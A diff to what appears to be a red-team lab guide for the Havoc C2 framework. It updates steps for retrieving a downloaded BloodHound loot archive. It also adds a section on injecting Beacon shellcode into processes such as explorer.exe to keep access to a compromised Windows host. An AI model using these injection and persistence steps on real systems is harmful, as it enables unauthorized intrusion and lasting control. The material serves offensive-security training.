@@ -116,12 +116,17 @@ ls
 download c:\loot\YYYYMMDDHHMMSS_BloodHound.zip
 ```
 
-3. Locate the `.zip` and move it to another directory on the Kali machine:
+3. Let's locate the downloaded SharpHound `.zip` file on the Kali machine
+
+Open a new tab on the File Manager (Documents) and go to:
 ```
-/home/kali/Havoc/Data/loot/[Date_time]/agents/[random string]/download/c:/loot/ YYYYMMDDHHMMSS_BloodHound.zip
+/home/kali/Havoc/Data/loot/
 ```
+The file should be in the folder `/home/kali/Havoc/Data/loot/[Date_time]/agents/[random string]/download/c:/loot/YYYYMMDDHHMMSS_BloodHound.zip`
 
 ![image](https://github.com/user-attachments/assets/dcf39b1a-7e40-468a-ad7d-81e0420ff8f2)
+
+4. Copy the `zip` file to another directory. (you can create a new folder like `/home/kali/bh`)
 
 ## BloodHound — Ingestion & Graph-Based Analysis
 
@@ -203,3 +208,31 @@ Usually we look for:
 > - `WriteDacl` for backdooring objects
 > - `ADCSESC1` for Active Directory certificate templates vulnerabilities
 > - `CanRDP` for Lateral Movement
+
+## EXTRAT : Shellcode Injection for Redundancy
+
+Before beginning active reconnaissance, it’s smart to preserve access by injecting the Beacon shellcode into another process 
+
+This provides a fallback in case the initial session is lost or crashes.
+
+### Process Discovery
+1. In the Havoc Client, open the active Beacon tab.
+2. Navigate to: Explorer > Process List
+3. A window will show the currently running processes on the target:
+4. Identify a suitable 64-bit user-mode process (e.g., `explorer.exe`, `notepad.exe`, `dllhost.exe`, `werfault.exe`, `sihost.exe`).
+5. Note the PID (Process ID)
+
+![image](https://github.com/user-attachments/assets/7a5ce666-2613-41e0-913e-77142fa4c988)
+
+### Inject Shellcode into Target Process
+From the Beacon tab, run:
+```beacon
+shellcode inject x64 PID /home/kali/Havoc/obfuscator/beacon.bin
+```
+Replace <PID> with the chosen target’s process ID.
+
+Ensure the `beacon.bin` used matches your current listener.
+
+![image](https://github.com/user-attachments/assets/e77adfde-982a-4b49-a931-2720bccda7f5)
+
+This creates a second active Beacon, adding persistence and resilience to your operation.
